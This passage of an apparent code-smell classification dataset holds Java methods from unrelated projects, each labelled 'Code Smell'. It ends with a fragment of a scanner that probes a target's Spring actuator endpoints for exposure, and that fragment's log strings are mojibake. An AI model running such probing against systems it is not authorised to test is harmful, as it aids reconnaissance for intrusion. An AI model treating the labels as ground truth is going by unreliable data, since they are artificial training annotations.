    return new ArrayList<>();
  }
  SqlSelect sqlSelect=parseProjectionExpression(projectionExpression);
  if (sqlSelect.getSelectList().isEmpty()) {
    return new ArrayList<>();
  }
  RelNode relNode=sqlToRel(columns,sqlSelect);
  Map<String,RelDataType> relDataTypeMap=relNode.getRowType().getFieldList().stream().collect(Collectors.toMap(RelDataTypeField::getName,RelDataTypeField::getType));
  Map<String,Boolean> isNotNullMap=columns.stream().collect(Collectors.toMap(Column::getName,column -> !column.getType().isNullable()));
  List<ProjectionColumn> projectionColumns=new ArrayList<>();
  for (  SqlNode sqlNode : sqlSelect.getSelectList()) {
    if (sqlNode instanceof SqlBasicCall) {
      SqlBasicCall sqlBasicCall=(SqlBasicCall)sqlNode;
      if (SqlKind.AS.equals(sqlBasicCall.getOperator().kind)) {
        Optional<SqlNode> transformOptional=Optional.empty();
        String columnName=null;
        List<SqlNode> operandList=sqlBasicCall.getOperandList();
        if (operandList.size() == 2) {
          transformOptional=Optional.of(operandList.get(0));
          SqlNode sqlNode1=operandList.get(1);
          if (sqlNode1 instanceof SqlIdentifier) {
            SqlIdentifier sqlIdentifier=(SqlIdentifier)sqlNode1;
            columnName=sqlIdentifier.names.get(sqlIdentifier.names.size() - 1);
          }
        }
        if (isMetadataColumn(columnName)) {
          continue;
        }
        ProjectionColumn projectionColumn=transformOptional.isPresent() ? ProjectionColumn.of(columnName,DataTypeConverter.convertCalciteRelDataTypeToDataType(relDataTypeMap.get(columnName)),transformOptional.get().toString(),JaninoCompiler.translateSqlNodeToJaninoExpression(transformOptional.get()),parseColumnNameList(transformOptional.get())) : ProjectionColumn.of(columnName,DataTypeConverter.convertCalciteRelDataTypeToDataType(relDataTypeMap.get(columnName)));
        boolean hasReplacedDuplicateColumn=false;
        for (int i=0; i < projectionColumns.size(); i++) {
          if (projectionColumns.get(i).getColumnName().equals(columnName) && !projectionColumns.get(i).isValidTransformedProjectionColumn()) {
            hasReplacedDuplicateColumn=true;
            projectionColumns.set(i,projectionColumn);
            break;
          }
        }
        if (!hasReplacedDuplicateColumn) {
          projectionColumns.add(projectionColumn);
        }
      }
 else {
        throw new ParseException(""Unrecognized projection: "" + sqlBasicCall.toString());
      }
    }
 else     if (sqlNode instanceof SqlIdentifier) {
      SqlIdentifier sqlIdentifier=(SqlIdentifier)sqlNode;
      String columnName=sqlIdentifier.names.get(sqlIdentifier.names.size() - 1);
      DataType columnType=DataTypeConverter.convertCalciteRelDataTypeToDataType(relDataTypeMap.get(columnName));
      if (isMetadataColumn(columnName)) {
        projectionColumns.add(ProjectionColumn.of(columnName,columnType.notNull(),columnName,columnName,Arrays.asList(columnName)));
      }
 else {
        projectionColumns.add(ProjectionColumn.of(columnName,isNotNullMap.get(columnName) ? columnType.notNull() : columnType.nullable()));
      }
    }
 else {
      throw new ParseException(""Unrecognized projection: "" + sqlNode.toString());
    }
  }
  return projectionColumns;
}",1,Code Smell
"private void pushPlayerBlock(BlockState state,Vector3d startingPos,double blockMovement,BoundingBox playerBoundingBox,boolean onGround){
  PistonCache pistonCache=session.getPistonCache();
  Vector3d movement=getMovement().toDouble();
  Vector3d finalBlockPos=startingPos.add(movement);
  if (SOLID_BOUNDING_BOX.checkIntersection(finalBlockPos,playerBoundingBox)) {
    pistonCache.setPlayerCollided(true);
    if (state.is(Blocks.SLIME_BLOCK)) {
      pistonCache.setPlayerSlimeCollision(true);
      applySlimeBlockMotion(finalBlockPos,playerBoundingBox);
    }
  }
  Vector3d blockPos=startingPos.add(movement.mul(blockMovement));
  if (state.is(Blocks.HONEY_BLOCK) && isPlayerAttached(blockPos,playerBoundingBox,onGround)) {
    pistonCache.setPlayerCollided(true);
    pistonCache.setPlayerAttachedToHoney(true);
    double delta=Math.abs(progress - lastProgress);
    pistonCache.displacePlayer(movement.mul(delta));
  }
 else {
    BlockCollision blockCollision=BlockRegistries.COLLISIONS.get(state.javaId());
    if (blockCollision != null) {
      Vector3d extend=movement.mul(Math.min(1 - blockMovement,0.5));
      Direction movementDirection=orientation;
      if (action == PistonValueType.PULLING) {
        movementDirection=orientation.reversed();
      }
      double intersection=getBlockIntersection(blockCollision,blockPos,extend,playerBoundingBox,movementDirection);
      if (intersection > 0) {
        pistonCache.setPlayerCollided(true);
        pistonCache.displacePlayer(movement.mul(intersection + 0.01d));
        if (state.is(Blocks.SLIME_BLOCK)) {
          pistonCache.setPlayerSlimeCollision(true);
          applySlimeBlockMotion(blockPos,playerBoundingBox);
        }
      }
    }
  }
}",1,Code Smell
"public static List<QuestionView> getQuestionAllService(Project project,boolean reset){
  Boolean isPremium=false;
  User user=WindowFactory.getDataContext(project).getData(DataKeys.LEETCODE_PROJECTS_TABS).getUser();
  if (user != null) {
    isPremium=user.isPremium();
  }
  if (questionAllCache.getIfPresent(URLUtils.getLeetcodeHost()) == null || reset) {
    String key=URLUtils.getLeetcodeHost() + ""getQuestionAll"";
synchronized (key.intern()) {
      if (questionAllCache.getIfPresent(URLUtils.getLeetcodeHost()) == null || reset) {
        HttpResponse response=Graphql.builder().cn(URLUtils.isCn()).operationName(""allQuestions"").cacheParam(WindowFactory.getDataContext(project).getData(DataKeys.LEETCODE_PROJECTS_TABS).getUser().getUsername()).request();
        if (response.getStatusCode() == 200) {
          List<QuestionView> questionViews=new ArrayList<>();
          JSONArray allQuestions=JSONObject.parseObject(response.getBody()).getJSONObject(""data"").getJSONArray(""allQuestions"");
          for (int i=0; i < allQuestions.size(); i++) {
            JSONObject jsonObject=allQuestions.getJSONObject(i);
            QuestionView questionView=jsonObject.toJavaObject(QuestionView.class);
            if (jsonObject.getBoolean(""isPaidOnly"") && !isPremium) {
              questionView.setStatus(""lock"");
            }
            if (URLUtils.isCn() && !PersistentConfig.getInstance().getConfig().getEnglishContent()) {
              if (StringUtils.isNotBlank(jsonObject.getString(""translatedTitle""))) {
                questionView.setTitle(jsonObject.getString(""translatedTitle""));
              }
            }
            questionViews.add(questionView);
          }
          Collections.sort(questionViews,(o1,o2) -> o1.frontendQuestionIdCompareTo(o2));
          Map<String,Integer> questionIndex=Maps.newHashMap();
          for (int i=0; i < questionViews.size(); i++) {
            questionIndex.put(questionViews.get(i).getTitleSlug(),i);
          }
          questionAllCache.put(URLUtils.getLeetcodeHost(),questionViews);
          questionIndexCache.put(URLUtils.getLeetcodeHost(),questionIndex);
        }
 else {
          questionAllCache.invalidate(URLUtils.getLeetcodeHost());
          questionIndexCache.remove(URLUtils.getLeetcodeHost());
        }
      }
    }
  }
  return questionAllCache.getIfPresent(URLUtils.getLeetcodeHost());
}",1,Code Smell
"private void register2Master() throws Throwable {
  int remainingRetry=this.tubeClientConfig.getMaxRegisterRetryTimes();
  StringBuilder sBuilder=new StringBuilder(512);
  do {
    if (isShutdown()) {
      logger.error(""Producer service has been shutdown, exit register to master!"");
      break;
    }
    remainingRetry--;
    try {
      ClientMaster.RegisterResponseM2P response=this.masterService.producerRegisterP2M(createRegisterRequest(),AddressUtils.getLocalAddress(),tubeClientConfig.isTlsEnable());
      if (response == null) {
        clientStatsInfo.bookReg2Master(true);
      }
 else {
        if (response.getSuccess()) {
          if (response.getBrokerCheckSum() != this.brokerInfoCheckSum) {
            updateBrokerInfoList(true,response.getBrokerInfosList(),response.getBrokerCheckSum(),sBuilder);
          }
          clientStatsInfo.bookReg2Master(false);
          processRegSyncInfo(response);
          return;
        }
 else {
          clientStatsInfo.bookReg2Master(true);
        }
      }
      if (remainingRetry <= 0) {
        if (response == null) {
          throw new TubeClientException(""Register producer failure, response is null!"");
        }
 else {
          throw new TubeClientException(sBuilder.append(""Register producer failure, error is "").append(response.getErrMsg()).toString());
        }
      }
      Thread.sleep(1000);
    }
 catch (    Throwable e) {
      sBuilder.delete(0,sBuilder.length());
      if (e instanceof LocalConnException) {
        logger.warn(""register2Master error, retry... exception: "",e);
      }
      ThreadUtils.sleep(1200);
      if (remainingRetry <= 0) {
        throw e;
      }
    }
  }
 while (true);
}",1,Code Smell
"private String addFLowNodeSuffix(String flowJson,String nodeSuffix) throws IOException {
  List<String> nodeJsonList=workFlowParser.getWorkFlowNodesJson(flowJson);
  List<DSSEdge> edgeList=workFlowParser.getWorkFlowEdges(flowJson);
  if (CollectionUtils.isEmpty(nodeJsonList)) {
    return flowJson;
  }
  List<Map<String,Object>> nodeList=new ArrayList<>();
  for (  String nodeJson : nodeJsonList) {
    Map<String,Object> nodeJsonMap=BDPJettyServerHelper.jacksonJson().readValue(nodeJson,Map.class);
    nodeJsonMap.replace(TITLE_KEY,nodeJsonMap.get(TITLE_KEY) + ""_"" + nodeSuffix);
    List<Resource> resourceList=nodeParser.getNodeResource(nodeJson);
    if (CollectionUtils.isNotEmpty(resourceList)) {
      String oldKey=(String)nodeJsonMap.get(""key"");
      final String newKey=UUID.randomUUID().toString();
      resourceList.forEach(resource -> {
        resource.setFileName(resource.getFileName().replace(oldKey,newKey));
      }
);
      nodeJsonMap.put(""resources"",resourceList);
      Map jobContent=(Map)nodeJsonMap.get(""jobContent"");
      if (MapUtils.isNotEmpty(jobContent)) {
        jobContent.forEach((k,v) -> {
          jobContent.put(k,((String)v).replace(oldKey,newKey));
        }
);
        nodeJsonMap.put(""jobContent"",jobContent);
      }
      nodeJsonMap.put(""id"",newKey);
      nodeJsonMap.put(""key"",newKey);
      if (CollectionUtils.isNotEmpty(edgeList)) {
        edgeList.forEach(e -> {
          if (e.getSource().equals(oldKey)) {
            e.setSource(newKey);
          }
          if (e.getTarget().equals(oldKey)) {
            e.setTarget(newKey);
          }
        }
);
      }
    }
    nodeList.add(nodeJsonMap);
  }
  flowJson=workFlowParser.updateFlowJsonWithKey(flowJson,""edges"",edgeList);
  return workFlowParser.updateFlowJsonWithKey(flowJson,""nodes"",nodeList);
}
",1,Code Smell
"private void dealData(Long moduleId,Integer version,AtomicInteger page,List<ModuleField> allFields,List<ModuleField> formulaFields,Map<Long,ModuleFieldFormula> fieldIdFormulaMap){
  SearchBO searchBO=new SearchBO();
  searchBO.setPage(page.getAndIncrement());
  searchBO.setLimit(2000);
  searchBO.setModuleId(moduleId);
  searchBO.setAuthFilter(false);
  BasePage<Map<String,Object>> data=queryPageList(searchBO,moduleId);
  Map<String,ModuleField> fieldNameMap=allFields.stream().collect(Collectors.toMap(ModuleField::getFieldName,Function.identity()));
  for (  Map<String,Object> map : data.getList()) {
    Long dataId=MapUtil.getLong(map,""dataId"");
    Map<Long,Object> fieldIdValue=new HashMap<>(16);
    for (    Map.Entry<String,Object> entry : map.entrySet()) {
      String fieldName=entry.getKey();
      Object value=entry.getValue();
      ModuleField field=fieldNameMap.get(fieldName);
      if (ObjectUtil.isNull(field)) {
        continue;
      }
      fieldIdValue.put(field.getFieldId(),value);
    }
    for (    ModuleField field : formulaFields) {
      ModuleFieldFormula fieldFormula=fieldIdFormulaMap.get(field.getFieldId());
      try {
        String valueStr;
        Object value=calculateFormula(moduleId,version,fieldIdValue,fieldFormula.getFormula());
        if (Arrays.asList(1,2,3).contains(fieldFormula.getType())) {
          if (value instanceof Number) {
            if (value instanceof BigDecimal) {
              BigDecimal bigDecimal=(BigDecimal)value;
              bigDecimal=bigDecimal.setScale(Optional.ofNullable(field.getPrecisions()).orElse(0),BigDecimal.ROUND_HALF_UP);
              valueStr=bigDecimal.toPlainString();
            }
 else             if (value instanceof Long) {
              BigDecimal bigDecimal=BigDecimal.valueOf(((Long)value).longValue());
              bigDecimal=bigDecimal.setScale(Optional.ofNullable(field.getPrecisions()).orElse(0),BigDecimal.ROUND_HALF_UP);
              valueStr=bigDecimal.toPlainString();
            }
 else             if (value instanceof Double) {
              BigDecimal bigDecimal=BigDecimal.valueOf(((Double)value).doubleValue());
              bigDecimal=bigDecimal.setScale(Optional.ofNullable(field.getPrecisions()).orElse(0),BigDecimal.ROUND_HALF_UP);
              valueStr=bigDecimal.toPlainString();
            }
 else {
              valueStr=value.toString();
            }
          }
 else {
            valueStr=BigDecimal.ZERO.toString();
          }
        }
 else {
          valueStr=value.toString();
        }
        fieldDataService.saveOrUpdate(field,valueStr,dataId,version,moduleId);
        Map<String,Object> fieldValueMap=new HashMap<>();
        fieldValueMap.put(field.getFieldName(),valueStr);
        updateField(fieldValueMap,dataId,moduleId);
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
  }
  if (page.get() < data.getPages()) {
    dealData(moduleId,version,page,allFields,formulaFields,fieldIdFormulaMap);
  }
}",1,Code Smell
"public static HashMap<String,Integer> getThemeFileValues(File file,String assetName,String[] wallpaperLink){
  FileInputStream stream=null;
  HashMap<String,Integer> stringMap=new HashMap<>(500);
  try {
    byte[] bytes=new byte[1024];
    int currentPosition=0;
    if (assetName != null) {
      file=getAssetFile(assetName);
    }
    stream=new FileInputStream(file);
    int idx;
    int read;
    boolean finished=false;
    int wallpaperFileOffset=-1;
    while ((read=stream.read(bytes)) != -1) {
      int previousPosition=currentPosition;
      int start=0;
      for (int a=0; a < read; a++) {
        if (bytes[a] == '\n') {
          int len=a - start + 1;
          String line=new String(bytes,start,len - 1);
          if (line.startsWith(""WLS="")) {
            if (wallpaperLink != null && wallpaperLink.length > 0) {
              wallpaperLink[0]=line.substring(4);
            }
          }
 else           if (line.startsWith(""WPS"")) {
            wallpaperFileOffset=currentPosition + len;
            finished=true;
            break;
          }
 else {
            if ((idx=line.indexOf('=')) != -1) {
              String key=line.substring(0,idx);
              String param=line.substring(idx + 1);
              int value;
              if (param.length() > 0 && param.charAt(0) == '#') {
                try {
                  value=Color.parseColor(param);
                }
 catch (                Exception ignore) {
                  value=Utilities.parseInt(param);
                }
              }
 else {
                value=Utilities.parseInt(param);
              }
              stringMap.put(key,value);
            }
          }
          start+=len;
          currentPosition+=len;
        }
      }
      if (previousPosition == currentPosition) {
        break;
      }
      stream.getChannel().position(currentPosition);
      if (finished) {
        break;
      }
    }
    stringMap.put(""wallpaperFileOffset"",wallpaperFileOffset);
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    try {
      if (stream != null) {
        stream.close();
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
  return stringMap;
}",1,Code Smell
"public boolean compareForRole(Set<String> formValues,String[] value){
  if (formValues == null || formValues.size() <= 0) {
    return false;
  }
  Iterator<String> iterator=formValues.iterator();
  while (iterator.hasNext()) {
    String next=iterator.next();
    EruptUser account=eruptUserRepository.findByAccount(next);
    boolean found=false;
    for (int i=0; i < value.length; i++) {
      if (account.getRoles() != null) {
        for (        EruptRole role : account.getRoles()) {
          if (role.getCode().equals(JSON.parseObject(value[i]).getString(""id""))) {
            found=true;
            break;
          }
        }
      }
    }
    if (!found) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"private static CreatePrimaryUserResult canCreatePrimaryUserHelper(TransactionConnection con,AppIdentifier appIdentifier,Storage storage,String recipeUserId) throws StorageQueryException, UnknownUserIdException, RecipeUserIdAlreadyLinkedWithPrimaryUserIdException, AccountInfoAlreadyAssociatedWithAnotherPrimaryUserIdException {
  AuthRecipeSQLStorage authRecipeStorage=StorageUtils.getAuthRecipeStorage(storage);
  AuthRecipeUserInfo targetUser=authRecipeStorage.getPrimaryUserById_Transaction(appIdentifier,con,recipeUserId);
  if (targetUser == null) {
    throw new UnknownUserIdException();
  }
  if (targetUser.isPrimaryUser) {
    if (targetUser.getSupertokensUserId().equals(recipeUserId)) {
      return new CreatePrimaryUserResult(targetUser,true);
    }
 else {
      throw new RecipeUserIdAlreadyLinkedWithPrimaryUserIdException(targetUser.getSupertokensUserId(),""This user ID is already linked to another user ID"");
    }
  }
  assert (targetUser.loginMethods.length == 1);
  LoginMethod loginMethod=targetUser.loginMethods[0];
  for (  String tenantId : targetUser.tenantIds) {
    if (loginMethod.email != null) {
      AuthRecipeUserInfo[] usersWithSameEmail=authRecipeStorage.listPrimaryUsersByEmail_Transaction(appIdentifier,con,loginMethod.email);
      for (      AuthRecipeUserInfo user : usersWithSameEmail) {
        if (!user.tenantIds.contains(tenantId)) {
          continue;
        }
        if (user.isPrimaryUser) {
          throw new AccountInfoAlreadyAssociatedWithAnotherPrimaryUserIdException(user.getSupertokensUserId(),""This user's email is already associated with another user ID"");
        }
      }
    }
    if (loginMethod.phoneNumber != null) {
      AuthRecipeUserInfo[] usersWithSamePhoneNumber=authRecipeStorage.listPrimaryUsersByPhoneNumber_Transaction(appIdentifier,con,loginMethod.phoneNumber);
      for (      AuthRecipeUserInfo user : usersWithSamePhoneNumber) {
        if (!user.tenantIds.contains(tenantId)) {
          continue;
        }
        if (user.isPrimaryUser) {
          throw new AccountInfoAlreadyAssociatedWithAnotherPrimaryUserIdException(user.getSupertokensUserId(),""This user's phone number is already associated with another user"" + "" ID"");
        }
      }
    }
    if (loginMethod.thirdParty != null) {
      AuthRecipeUserInfo[] usersWithSameThirdParty=authRecipeStorage.listPrimaryUsersByThirdPartyInfo_Transaction(appIdentifier,con,loginMethod.thirdParty.id,loginMethod.thirdParty.userId);
      for (      AuthRecipeUserInfo userWithSameThirdParty : usersWithSameThirdParty) {
        if (!userWithSameThirdParty.tenantIds.contains(tenantId)) {
          continue;
        }
        if (userWithSameThirdParty.isPrimaryUser) {
          throw new AccountInfoAlreadyAssociatedWithAnotherPrimaryUserIdException(userWithSameThirdParty.getSupertokensUserId(),""This user's third party login is already associated with another"" + "" user ID"");
        }
      }
    }
  }
  return new CreatePrimaryUserResult(targetUser,false);
}",1,Code Smell
"private boolean isColorTooSimilar(BufferedImage image,int left,int top,int width,int height,Color setColor){
  int startX=left + 2;
  int endX=left + width - 2;
  int startY=top + 2;
  int endY=top + height - 2;
  int similarPointCount=0;
  int totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  startX=left - 2;
  endX=left + width + 2;
  startY=top - 2;
  endY=top + height + 2;
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  return ((similarPointCount * 1.0 / totalPointCount) >= 0.5f);
}",1,Code Smell
"/** 
 * Mark completed tiles as loaded, and replaces them by beginning to wait on new positions from the queue (if possible).
 */
protected void updateWaiting(){
  int targetLoadQueueSize=FP2Config.global().performance().terrainThreads();
  List<POS> positions=new ArrayList<>();
  do {
    if (this.queuePaused) {
      return;
    }
    if (!PUnsafe.tryMonitorEnter(this)) {
      return;
    }
    try {
      for (POS pos; (pos=this.doneWaitingPositions.poll()) != null; ) {
        this.waitingPositions.remove(pos);
        this.loadedPositions.add(pos);
      }
      if (this.queuedPositions.isEmpty()) {
        return;
      }
      for (int count=targetLoadQueueSize - this.waitingPositions.size(); count > 0; count--) {
        POS pos=this.queuedPositions.poll();
        if (pos == null) {
          break;
        }
        positions.add(pos);
      }
    }
  finally {
      PUnsafe.monitorExit(this);
    }
    this.waitingPositions.addAll(positions);
    positions.forEach(pos -> this.manager.beginTracking(this,pos));
    positions.clear();
  }
 while (!this.doneWaitingPositions.isEmpty() || this.waitingPositions.size() < targetLoadQueueSize);
}",1,Code Smell
"/** 
 * Delete a folder.
 * @param file The folder name.
 * @return true if successful.
 */
private static boolean rmdir(@NonNull final File file,Context context){
  if (!file.exists())   return true;
  File[] files=file.listFiles();
  if (files != null && files.length > 0) {
    for (    File child : files) {
      rmdir(child,context);
    }
  }
  if (file.delete()) {
    return true;
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    DocumentFile document=getDocumentFile(file,true,context);
    if (document != null && document.delete()) {
      return true;
    }
  }
  if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
    ContentResolver resolver=context.getContentResolver();
    ContentValues values=new ContentValues();
    values.put(MediaStore.MediaColumns.DATA,file.getAbsolutePath());
    resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,values);
    resolver.delete(MediaStore.Files.getContentUri(""external""),MediaStore.MediaColumns.DATA + ""=?"",new String[]{file.getAbsolutePath()});
  }
  return !file.exists();
}",1,Code Smell
"/** 
 * 注册provider或者receiver对象
 * @param any
 */
public int register(Object any){
  if (any == null) {
    LogUtil.w(TAG,""无法注册空对象"");
    return REGISTER_NULL_OBJECT;
  }
  ClassInfo targetClassInfo=cache.getClassInfo(any.getClass());
  if (targetClassInfo == null) {
    LogUtil.w(TAG,""未找到可注册内容，%s"",any.getClass().getSimpleName());
    return REGISTER_FAILED;
  }
  if (targetClassInfo.getCachedInjectInfo() != null) {
    for (    InjectParamMeta paramMeta : targetClassInfo.getCachedInjectInfo()) {
      InjectParam type=paramMeta.getParamType();
      ParamReference reference=referenceMap.get(type.getName());
      if (reference == null) {
        reference=new ParamReference(type);
        referenceMap.put(type.getName(),reference);
      }
      paramMeta.addToReference(reference,any);
    }
  }
  if (targetClassInfo.getCachedProviderInfo() != null) {
    for (    ProviderInfoMeta providerMeta : targetClassInfo.getCachedProviderInfo()) {
      WeakInjectItem weakInjectItem=providerMeta.buildWeakInjectItem(any);
      ProviderInfo providerInfo=providerMeta.buildProvider();
      providers.add(new Pair<>(providerInfo,weakInjectItem));
    }
  }
  LogUtil.d(TAG,""注册【%s】成功，提供%d个，需要%d个参数"",any.getClass().getSimpleName(),targetClassInfo.getCachedProviderInfo().size(),targetClassInfo.getCachedInjectInfo().size());
  return REGISTER_SUCCESS;
}
",1,Code Smell
"/** 
 * Gets all of the collectable constant values used in this method, sorted by most used first. Skips non-collectable consts, such as non-string object constants
 * @return {@code non-null;} list of constants in most-to-least used order
 */
private ArrayList<TypedConstant> getConstsSortedByCountUse(){
  int regSz=ssaMeth.getRegCount();
  final HashMap<TypedConstant,Integer> countUses=new HashMap<TypedConstant,Integer>();
  final HashSet<TypedConstant> usedByLocal=new HashSet<TypedConstant>();
  for (int i=0; i < regSz; i++) {
    SsaInsn insn=ssaMeth.getDefinitionForRegister(i);
    if (insn == null || insn.getOpcode() == null)     continue;
    RegisterSpec result=insn.getResult();
    TypeBearer typeBearer=result.getTypeBearer();
    if (!typeBearer.isConstant())     continue;
    TypedConstant cst=(TypedConstant)typeBearer;
    if (insn.getOpcode().getOpcode() == RegOps.MOVE_RESULT_PSEUDO) {
      int pred=insn.getBlock().getPredecessors().nextSetBit(0);
      ArrayList<SsaInsn> predInsns;
      predInsns=ssaMeth.getBlocks().get(pred).getInsns();
      insn=predInsns.get(predInsns.size() - 1);
    }
    if (insn.canThrow()) {
      if (!(cst instanceof CstString) || !COLLECT_STRINGS) {
        continue;
      }
      if (insn.getBlock().getSuccessors().cardinality() > 1) {
        continue;
      }
    }
    if (ssaMeth.isRegALocal(result)) {
      if (!COLLECT_ONE_LOCAL) {
        continue;
      }
 else {
        if (usedByLocal.contains(cst)) {
          continue;
        }
 else {
          usedByLocal.add(cst);
        }
      }
    }
    Integer has=countUses.get(cst);
    if (has == null) {
      countUses.put(cst,1);
    }
 else {
      countUses.put(cst,has + 1);
    }
  }
  ArrayList<TypedConstant> constantList=new ArrayList<TypedConstant>();
  for (  Map.Entry<TypedConstant,Integer> entry : countUses.entrySet()) {
    if (entry.getValue() > 1) {
      constantList.add(entry.getKey());
    }
  }
  Collections.sort(constantList,new Comparator<Constant>(){
    @Override public int compare(    Constant a,    Constant b){
      int ret;
      ret=countUses.get(b) - countUses.get(a);
      if (ret == 0) {
        ret=a.compareTo(b);
      }
      return ret;
    }
    @Override public boolean equals(    Object obj){
      return obj == this;
    }
  }
);
  return constantList;
}",1,Code Smell
"/** 
 * Make a QQ custom toast.
 * @param context  The context to use.
 * @param type     The type of toast, Either {@link #TYPE_INFO},  {@link #TYPE_ERROR},  {@link #TYPE_SUCCESS} or{@link #TYPE_INFO}
 * @param text     The text to show.
 * @param duration How long to display the message.  Either {@link #LENGTH_SHORT} or {@link #LENGTH_LONG}
 */
public static void showToast(@Nullable Context context,int type,@NonNull final CharSequence text,int duration){
  Objects.requireNonNull(text,""text"");
  if (context == null) {
    context=HostInfo.getApplication();
  }
  final Context ctx=context;
  SyncUtils.runOnUiThread(() -> {
    if (type == TYPE_PLAIN) {
      Toast.makeText(ctx,text,duration).show();
    }
 else {
      try {
        if (clazz_QQToast == null) {
          clazz_QQToast=load(""com/tencent/mobileqq/widget/QQToast"");
        }
        if (clazz_QQToast == null) {
          Class<?> clz=load(""com/tencent/mobileqq/activity/aio/doodle/DoodleLayout"");
          if (clz != null) {
            Field[] fs=clz.getDeclaredFields();
            for (            Field f : fs) {
              if (View.class.isAssignableFrom(f.getType())) {
                continue;
              }
              if (f.getType().isPrimitive()) {
                continue;
              }
              if (f.getType().isInterface()) {
                continue;
              }
              clazz_QQToast=f.getType();
            }
          }
 else {
            clazz_QQToast=load(""com.tencent.qqmini.sdk.core.widget.QQToast"");
          }
        }
        if (method_Toast_show == null) {
          Method[] ms=clazz_QQToast.getMethods();
          for (          Method m : ms) {
            if (Toast.class.equals(m.getReturnType()) && m.getParameterTypes().length == 0) {
              method_Toast_show=m;
              break;
            }
          }
        }
        if (method_Toast_makeText == null) {
          try {
            method_Toast_makeText=clazz_QQToast.getMethod(""a"",Context.class,int.class,CharSequence.class,int.class);
          }
 catch (          NoSuchMethodException e) {
            try {
              method_Toast_makeText=clazz_QQToast.getMethod(""b"",Context.class,int.class,CharSequence.class,int.class);
            }
 catch (            NoSuchMethodException e2) {
              try {
                method_Toast_makeText=clazz_QQToast.getMethod(""makeText"",Context.class,int.class,CharSequence.class,int.class);
              }
 catch (              NoSuchMethodException e3) {
                throw e;
              }
            }
          }
        }
        Object this_QQToast_does_NOT_extend_a_standard_Toast_so_please_do_NOT_cast_it_to_Toast=method_Toast_makeText.invoke(null,ctx,type,text,duration);
        method_Toast_show.invoke(this_QQToast_does_NOT_extend_a_standard_Toast_so_please_do_NOT_cast_it_to_Toast);
      }
 catch (      Exception e) {
        Log.e(e);
        Toast.makeText(ctx,text,duration).show();
      }
    }
  }
);
}",1,Code Smell
"private static boolean isConstructorInvocationRemote(List<Exprent> list,int index){
  Exprent current=list.get(index);
  if (current.type == Exprent.EXPRENT_ASSIGNMENT) {
    AssignmentExprent as=(AssignmentExprent)current;
    if (as.getLeft().type == Exprent.EXPRENT_VAR && as.getRight().type == Exprent.EXPRENT_NEW) {
      NewExprent newExpr=(NewExprent)as.getRight();
      VarType newType=newExpr.getNewType();
      VarVersionPair leftPair=new VarVersionPair((VarExprent)as.getLeft());
      if (newType.type == CodeConstants.TYPE_OBJECT && newType.arrayDim == 0 && newExpr.getConstructor() == null) {
        for (int i=index + 1; i < list.size(); i++) {
          Exprent remote=list.get(i);
          if (remote.type == Exprent.EXPRENT_INVOCATION) {
            InvocationExprent in=(InvocationExprent)remote;
            if (in.getFunctype() == InvocationExprent.TYP_INIT && in.getInstance().type == Exprent.EXPRENT_VAR && as.getLeft().equals(in.getInstance())) {
              newExpr.setConstructor(in);
              in.setInstance(null);
              list.set(i,as.copy());
              return true;
            }
          }
          Set<VarVersionPair> setVars=remote.getAllVariables();
          if (setVars.contains(leftPair)) {
            return false;
          }
        }
      }
    }
  }
  return false;
}",1,Code Smell
"public boolean checkPoint(String target,String point){
  String url=URLUtil.normalizeURL(target) + point;
  System.out.println(""姝ｅ湪妫�娴嬶細\t"" + url);
  HttpResponse response=HTTPUtils.getRequest(url);
  if (response.getStatus() == 200) {
    if (this.checkPoint(url,response)) {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣瀛樺湪锛屽凡鍋氶獙璇侊細""+ url));
      flag=true;
    }
 else {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣锛岃鎵嬪伐楠岃瘉: ""+ url));
    }
  }
  return flag;
}
public boolean checkPoint(String url,HttpResponse resp){
  String s=resp.body();
  if (url.contains(""hystrix.stream"")) {
    return ""ping:"".contains(s) || ""data:"".contains(s);
  }
 else   if (url.contains(""health"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""status"") || res.containsKey(""diskSpace"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""beans"")) {
    Map res;
    try {
